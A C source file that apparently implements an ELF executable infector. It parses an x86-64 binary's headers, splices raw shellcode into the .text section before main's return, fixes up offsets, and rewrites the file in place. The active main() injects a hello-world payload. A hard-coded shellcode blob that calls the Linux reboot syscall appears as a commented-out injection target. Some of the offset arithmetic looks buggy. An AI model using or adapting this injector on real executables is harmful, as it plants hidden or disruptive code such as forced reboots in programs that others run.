#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define SHOFF 0x28
#define SHNUM 0x3C
#define SHSTRINX 0x3E
#define SHENTSIZE 0x3A
#define E_PHOFF 0x20
#define E_PHENTSIZE 0x36
#define E_PHNUM 0x38
#define TEXT ".text"	
#define INIT ".init"	
#define RODATA ".rodata"	

const uint8_t return_lens[] = {7,3,7};
const char *Return_instructions[] = {"\xb8\x00\x00\x00\x00\x5d\xc3","\x31\xc0\xc3","\xb8\x00\x00\x00\x00\xc9\xc3",NULL};
const char reboot[] = "\xBF\xAD\xDE\xE1\xFE\xBE\x69\x19\x12\x28\xBA\x67\x45\x23\x01\x45\x31\xD2\xB8\xA9\x00\x00\x00\x0F\x05";

const char  ELF_h[]  = "\x7F\x45\x4C\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3E\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00";

const char program_header[] = "\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\xA4\x00\x00\x00\x00\x00\x00\x00\xA4\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00";

const char Hello_word[]  = "\xB8\x01\x00\x00\x00\xBF\x01\x00\x00\x00\x48\x8D\x35\x10\x00\x00\x00\xBA\x0D\x00\x00\x00\x0F\x05\xB8\x3C\x00\x00\x00\x31\xFF\x0F\x05hello world\n";

/*thi function look for .text in the ELF, and 
finds the first b800000000 instruction from the end of .text (likely a return 0; in a main() function)*/
int inject_instruction_silent(char *target,char *instruction,int inst_size){

	int flag = S_IRWXU | S_IRWXO; 
	int fd = open(target,O_RDONLY,flag);
	if(fd == -1) return -1;

	off_t size = lseek(fd,0,SEEK_END);
	if(size == -1){
		close(fd);
		return -1;
	}

	if(lseek(fd,0,SEEK_SET) == -1){
		close(fd);
		return -1;
	}

	
	unsigned char cpy[size+1];
	memset(cpy,0,size+1);

	if(read(fd,cpy,size) == -1){
		close(fd);
		return -1;
	}

	close(fd);
	fd = -1;
	/*here we have the target program in memory*/
	/*FIND the section_to_inject  offset in the file(program)*/	
	
	off_t program_header_start = 0;
	memcpy(&program_header_start,&cpy[E_PHOFF],sizeof(off_t));

	uint16_t program_header_entry = 0;
	memcpy(&program_header_entry,&cpy[E_PHENTSIZE],sizeof(uint16_t));

	uint16_t ph_num = 0;
	memcpy(&ph_num,&cpy[E_PHNUM],sizeof(uint16_t));

	off_t section_header_start = 0;
	memcpy(&section_header_start,&cpy[SHOFF],sizeof(off_t));

	uint16_t sh_num = 0;
	memcpy(&sh_num,&cpy[SHNUM],sizeof(uint16_t));

	uint16_t str_symbol_index = 0;
	memcpy(&str_symbol_index,&cpy[SHSTRINX],sizeof(uint16_t));

	unsigned char sh_strsym[65] = {0};
	off_t str_symbol_table_data_off = section_header_start + (str_symbol_index * 64);
	memcpy(sh_strsym,&cpy[str_symbol_table_data_off],64);
	
	off_t sh_strtbl_off = 0;	
	size_t sh_strtbl_sz = 0;
	memcpy(&sh_strtbl_off,&sh_strsym[0x18],8);
	memcpy(&sh_strtbl_sz,&sh_strsym[0x20],8);
	
	unsigned char strtbl[sh_strtbl_sz+1];
	memset(strtbl,0,sh_strtbl_sz+1);
	memcpy(strtbl,&cpy[sh_strtbl_off],sh_strtbl_sz);
	
	/*read section header to understand where to inject the code
		 look for .text sections */

	int i = 0;
	ssize_t __text_sz = 0, bread = section_header_start;
	ssize_t __text_sh_start = 0;
	off_t 	__text_offset = 0;
	off_t 	__init_offset = 0;
	off_t	__ro_data_offset = 0;

	while(i < sh_num){
		uint32_t sh_name = 0;	
		
		memcpy(&sh_name,&cpy[bread],sizeof(uint32_t));
		if(!sh_name){
			bread += 64;
			i++;
			continue;
		}

		if(strncmp(RODATA,&strtbl[sh_name],strlen(RODATA)) == 0){
			memcpy(&__ro_data_offset,&cpy[bread+0x18],sizeof(off_t));
			if(__ro_data_offset == 0) return -1;

			break;

		}
		if(strncmp(INIT,&strtbl[sh_name],strlen(INIT)) == 0){
			memcpy(&__init_offset,&cpy[bread+0x18],sizeof(off_t));
			if(__init_offset == 0) return -1;

			bread += 64;
			i++;
			continue;

		}

		if(strncmp(TEXT,&strtbl[sh_name],strlen(TEXT)) == 0){
			__text_sh_start = bread;
			memcpy(&__text_offset,&cpy[bread+0x18],sizeof(off_t));
			if(__text_offset == 0) return -1;

			memcpy(&__text_sz,&cpy[bread+0x20],8);
			if(__text_sz == 0) return -1;
		}

		bread += 64;
		i++;
	}	

	/*extract the .text segment from the cpy buffer*/
	unsigned char __text[__text_sz+1];
	size_t __new_text_sz = __text_sz + inst_size;
	uint8_t __NEW_text[__new_text_sz + 1];
	memset(__text,0,__text_sz+1);
	memset(__NEW_text,0,__text_sz + inst_size + 1);

	memcpy(__text,&cpy[__text_offset],__text_sz);	

	int j = 0;
	while(Return_instructions[j]){
		uint64_t start = __text_sz-return_lens[j];
		if(memcmp(&__text[start],
				Return_instructions[j],
				return_lens[j]) == 0){
			/*start-1 is where to inject!*/
			memcpy(__NEW_text,__text,start);
			memcpy(&__NEW_text[start],instruction,inst_size);
			start += inst_size;
			memcpy(&__NEW_text[start],Return_instructions[j],return_lens[j]);
			/*change the size of .text segment in the section header table*/
			memcpy(&cpy[bread+0x20],&start,sizeof(uint64_t));
			break;
		}
		j++;
	}

	/*change offsets after .text segment and offset of the section header table as well*/
	i++; bread+=64;
	while(i < sh_num){
		off_t old = 0;
		memcpy(&old,&cpy[bread+0x18],sizeof(off_t));
		old += (off_t) inst_size;
		memcpy(&cpy[bread+0x18],&old,sizeof(off_t));
		bread += 64;
		i++;
	}

	/*change the offset in program header table*/
	
	i = 0;
	bread = program_header_start;
	off_t padding_before_rodata = 0;
	off_t __new_rodata_offset = 0;
	while(i < ph_num){
		off_t old = 0;
		memcpy(&old,&cpy[bread+0x08],sizeof(off_t));
		if(old > __text_offset){
			off_t new = ((old + (off_t) inst_size) + 15) & ~15;
			memcpy(&cpy[bread+0x08],&new,sizeof(off_t));
			if(old == __ro_data_offset){
				__new_rodata_offset = new;
				padding_before_rodata = new - old - (off_t)inst_size;
				memcpy(&cpy[bread+0x18],&new,sizeof(off_t));
			}

		}

		if(old == __init_offset){
			size_t old_size = 0;
			memcpy(&old_size,&cpy[bread+0x20],sizeof(size_t));
			old_size += (size_t) inst_size;
			memcpy(&cpy[bread+0x20],&old_size,sizeof(size_t));
			old_size = (old_size + 15) & ~(15);
			
			memcpy(&cpy[bread+0x28],&old_size,sizeof(size_t));
		}
		bread += (ssize_t)program_header_entry;
		i++;
	}
	/*build the new elf*/
	int new_elf_size = size + inst_size + padding_before_rodata;
	unsigned char new_elf[new_elf_size + 1];
	memset(new_elf,0,new_elf_size + 1);


	uint8_t pad = 0;
	memcpy(new_elf,cpy,__text_offset);
	memcpy(&new_elf[__text_offset],__NEW_text,__new_text_sz);
	memcpy(&new_elf[__new_text_sz+__text_offset],
			&cpy[__text_offset+__text_sz],
			__ro_data_offset - (__text_offset + __text_sz));

	memcpy(&new_elf[__new_rodata_offset],
			&cpy[__ro_data_offset],
			size - (__ro_data_offset + __text_offset + __text_sz));
	
	section_header_start += (off_t)inst_size;
	memcpy(&new_elf[SHOFF],&section_header_start,sizeof(off_t));

	/*write the file*/
	fd = open(target,O_WRONLY | O_TRUNC,flag);
	if(fd == -1) return -1;
	
	int r = write(fd,new_elf,new_elf_size);
	close(fd);
		
	if(r == -1) return -1;
	return 0;
}
int inject_instruction(char *target,char *section_to_inject, char *instruction,int inst_size)
{
	int flag = S_IRWXU | S_IRWXO; 
	int fd = open(target,O_RDONLY,flag);
	if(fd == -1) return -1;

	off_t size = lseek(fd,0,SEEK_END);
	if(size == -1){
		close(fd);
		return -1;
	}

	if(lseek(fd,0,SEEK_SET) == -1){
		close(fd);
		return -1;
	}

	
	unsigned char cpy[size+1];
	memset(cpy,0,size+1);

	if(read(fd,cpy,size) == -1){
		close(fd);
		return -1;
	}

	close(fd);
	fd = -1;
	/*here we have the target program in memory*/
	
	/*FIND the section_to_inject  offset in the file(program)*/	
	
	off_t section_header_start = 0;
	memcpy(&section_header_start,&cpy[SHOFF],sizeof(off_t));

	uint16_t sh_num = 0;
	memcpy(&sh_num,&cpy[SHNUM],sizeof(uint16_t));

	uint16_t str_symbol_index = 0 ;
	memcpy(&str_symbol_index,&cpy[SHSTRINX],sizeof(uint16_t));

	unsigned char sh_strsym[65] = {0};
	off_t str_symbol_table_data_off = section_header_start + (str_symbol_index * 64);
	memcpy(sh_strsym,&cpy[str_symbol_table_data_off],64);
	
	off_t sh_strtbl_off = 0;	
	size_t sh_strtbl_sz = 0;
	memcpy(&sh_strtbl_off,&sh_strsym[0x18],8);
	memcpy(&sh_strtbl_sz,&sh_strsym[0x20],8);
	
	unsigned char strtbl[sh_strtbl_sz+1];
	memset(strtbl,0,sh_strtbl_sz+1);
	memcpy(strtbl,&cpy[sh_strtbl_off],sh_strtbl_sz);
	
	/*read section header to understand where to inject the code
		 you can inject in .init or .text sections */

	int i = 0;
	ssize_t bread = section_header_start;
	off_t offset = 0;
	while(i < sh_num){
		uint32_t sh_name = 0;	
		memcpy(&sh_name,&cpy[bread],sizeof(uint32_t));
		if(!sh_name){
			bread += 64;
			i++;
			continue;
		}

		if(strncmp(section_to_inject,&strtbl[sh_name],strlen(section_to_inject)) == 0){
			memcpy(&offset,&cpy[bread+0x18],sizeof(off_t));
			if(offset) break;
		}
		bread += 64;
		i++;
		continue;
	}	
	fd = open(target,O_WRONLY,flag);
	if(fd == -1){
		printf("cannot create the program\n");
		return 0;
	}

	if(lseek(fd,offset,SEEK_SET) == -1){
		close(fd);
		return 1;
	}

	/*INJECTION*/
	int r = write(fd,instruction,inst_size);
	close(fd);

	if(r == -1) return -1;
	return 0;
}


int main(){
	
	int r = inject_instruction_silent("CIAO_pie",(char *)Hello_word,sizeof(Hello_word)-1);
//	int r = inject_instruction("main",".text",(char*)reboot,sizeof(reboot)-1);
	if(r == -1) return -1;
	return 0;
}
